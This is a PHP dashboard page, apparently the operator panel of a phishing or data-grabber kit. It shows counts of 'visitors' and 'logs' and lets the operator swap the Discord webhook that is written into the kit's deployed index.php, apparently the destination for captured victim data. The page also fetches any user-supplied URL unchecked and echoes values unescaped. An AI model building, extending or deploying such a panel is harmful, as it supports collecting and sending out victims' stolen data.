<?php
session_start();
$token = $_SESSION['token'];
if(!$token){
header("Location: sign-in.php");
}else{
$web = $_SESSION['web'];
$dir = $_SESSION['dir'];
$visits = file_get_contents("../$dir/visits.txt");
$logs = file_get_contents("../$dir/logs.txt");
if(!$visits){
$visits = '0';
}
if(!$logs){
$logs = '0';
}
}
$webhook = $_POST['web'];
if($webhook){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $webhook); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($curl, CURLOPT_HTTPGET, true);
$req = curl_exec($curl);
$jd = json_decode($req, true);
$err = $jd['guild_id'];



if (!$err) {
$error = "Invalid Webhook";
}
if(!$error) {
$index = file_get_contents("../$dir/index.php");
$nindex = str_replace($web,$webhook,$index);
$path = "../$dir/"; 
$fo = fopen($path."index.php", 'w'); 
$fo2 = fopen("apis/tokens/$token.txt", 'w'); 
if ($fo) {
    fwrite($fo, $nindex); 
     fwrite($fo2, "$dir $webhook"); 
     $js = 'Swal.fire({ title: "Good job!", text: "Webhook Changed", icon: "success" });';
}
}
}
if($error){
$js = 'Swal.fire({ title: "Error", text: "'.$error.'", icon: "error" });';
}
?>
<!DOCTYPE html>
<html lang="en">



<!--JJz--><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!--rya2jew-->
<head>
<meta charset="UTF-8">
	<style>
	body,
	html {
		background: rgb(24, 24, 28) !important;
	}
	html,body,img {padding: 0; margin: 0;height:100%;width:100%}
body {font-family: Sans-Serif;}

.container{}
.cycle-slideshow {
    height: 100%;
	</style>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Dashboard</title>
	<!-- CSS / Bootstrap -->
	<link href="new/assets/css/imports.css" rel="stylesheet">
	<!-- SNACKBAR -->
	<link rel="stylesheet" href="new/assets/css/snackbar.css" />
	<script src="new/assets/js/snackbar.js"></script>
	<style>
	body {
	overflow: scroll;
-webkit-overflow-scrolling: touch;
	}
	    .swal2-container {
	        z-index: 20000 !important;
	    }
	</style>
</head>

<body>
	<section id="login" class="form">
		<div class="container h-100">
			<div class="row justify-content-center align-items-center h-100">
				<div class="col-md-10 col-lg-5">
					
						<center><h2>Controller</h2><center>
							
					
					<body style="background:black;color:white;">
<option onclick="window.location.href='logout.php';" style="position:absolute; top:0; right:0;cursor: pointer;">Logout </option>
	
								
							
								<hr style="background:white;">
								<br>
								<span>Your Visitors: <?php echo $visits; ?></span>
								<br>
							   <span>Your Logs: <?php echo $logs; ?></span>

								
								<br><hr style="background:white;"><br>
			<form method="post">
	<h3 class="box-title"> Webhook</h3>
                <div class="form-group mb-4">
                <div class="col-md-12 border-bottom p-0">
                <input type="text" class="form-control p-0 border-0" value=" <?php echo $web; ?>" disabled> </div>
                    				<br>
                <div class="col-md-12 border-bottom p-0">
                <input type="text" name="web" placeholder=" New Webhook" class="form-control p-0 border-0"> </div>
                    		</div>
                    		<button type="submit" class="button primary d-block mt-3 w-100" style="color:black">Edit</button>
                    		<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
                    	<script> <?php echo $js; ?> </script>